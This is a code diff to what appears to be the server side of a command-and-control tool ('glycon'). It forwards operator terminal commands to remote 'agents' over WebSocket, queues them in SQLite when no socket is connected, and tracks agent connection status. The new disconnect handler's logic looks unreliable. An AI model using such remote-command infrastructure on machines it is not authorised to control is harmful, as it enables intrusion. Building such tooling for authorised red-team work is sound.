@@ -8,6 +8,8 @@ import os
 from glycon.secure_comms import SecureComms
 
 def init_socket_handlers(socketio):
+    active_agents = {}  # Track active WebSocket connections
+    
     @socketio.on('connect', namespace='/terminal')
     def handle_terminal_connect():
         if current_user.is_authenticated:
@@ -39,43 +41,51 @@ def init_socket_handlers(socketio):
         if not agent_id or not command:
             return
             
-        try:
-            conn = sqlite3.connect(CONFIG.database)
-            c = conn.cursor()
-            
-            task_data = {
-                'type': 'terminal',
+        # Forward command directly to agent if connected via WebSocket
+        if agent_id in active_agents:
+            emit('command', {
                 'command': command,
-                'current_dir': current_dir,
-                'terminal': True,
-                'timestamp': datetime.now().isoformat()
-            }
-            
-            c.execute("INSERT INTO tasks VALUES (?, ?, ?, ?, ?, ?, ?)",
-                    (None, 
-                    agent_id, 
-                    'terminal', 
-                    json.dumps(task_data),
-                    'pending',
-                    datetime.now().isoformat(),
-                    None))
-            
-            conn.commit()
-            task_id = c.lastrowid
-            conn.close()
-            
-            emit('output', {
-                'agent_id': agent_id,
-                'command': command,
-                'output': f"Command queued (Task ID: {task_id})",
-                'task_id': task_id
-            }, room=f"terminal_{agent_id}", namespace='/terminal')
-            
-        except Exception as e:
-            emit('output', {
-                'agent_id': agent_id,
-                'error': f"Command submission failed: {str(e)}"
-            }, room=f"terminal_{agent_id}", namespace='/terminal')
+                'current_dir': current_dir
+            }, room=f"agent_{agent_id}", namespace='/terminal')
+        else:
+            # Fallback to task-based execution if WebSocket not connected
+            try:
+                conn = sqlite3.connect(CONFIG.database)
+                c = conn.cursor()
+                
+                task_data = {
+                    'type': 'terminal',
+                    'command': command,
+                    'current_dir': current_dir,
+                    'terminal': True,
+                    'timestamp': datetime.now().isoformat()
+                }
+                
+                c.execute("INSERT INTO tasks VALUES (?, ?, ?, ?, ?, ?, ?)",
+                        (None, 
+                        agent_id, 
+                        'terminal', 
+                        json.dumps(task_data),
+                        'pending',
+                        datetime.now().isoformat(),
+                        None))
+                
+                conn.commit()
+                task_id = c.lastrowid
+                conn.close()
+                
+                emit('output', {
+                    'agent_id': agent_id,
+                    'command': command,
+                    'output': f"Command queued (Task ID: {task_id})",
+                    'task_id': task_id
+                }, room=f"terminal_{agent_id}", namespace='/terminal')
+                
+            except Exception as e:
+                emit('output', {
+                    'agent_id': agent_id,
+                    'error': f"Command submission failed: {str(e)}"
+                }, room=f"terminal_{agent_id}", namespace='/terminal')
 
     @socketio.on('ws_control', namespace='/terminal')
     def handle_ws_control(data):
@@ -133,6 +143,15 @@ def init_socket_handlers(socketio):
                 return False
             
             join_room(f"agent_{data['agent_id']}", namespace='/terminal')
+            active_agents[data['agent_id']] = True
+            
+            # Update database with WebSocket connection status
+            conn = sqlite3.connect(CONFIG.database)
+            c = conn.cursor()
+            c.execute("UPDATE agents SET ws_connected=1 WHERE id=?", (data['agent_id'],))
+            conn.commit()
+            conn.close()
+            
             emit('agent_connected', {
                 'status': 'success',
                 'agent_id': data['agent_id']
@@ -140,3 +159,16 @@ def init_socket_handlers(socketio):
             return True
         except:
             return False
+
+    @socketio.on('disconnect', namespace='/terminal')
+    def handle_agent_disconnect():
+        # Clean up any agent connections on disconnect
+        for agent_id in list(active_agents.keys()):
+            if f"agent_{agent_id}" in socketio.server.manager.rooms['/terminal']:
+                active_agents.pop(agent_id, None)
+                # Update database with WebSocket disconnection status
+                conn = sqlite3.connect(CONFIG.database)
+                c = conn.cursor()
+                c.execute("UPDATE agents SET ws_connected=0 WHERE id=?", (agent_id,))
+                conn.commit()
+                conn.close()
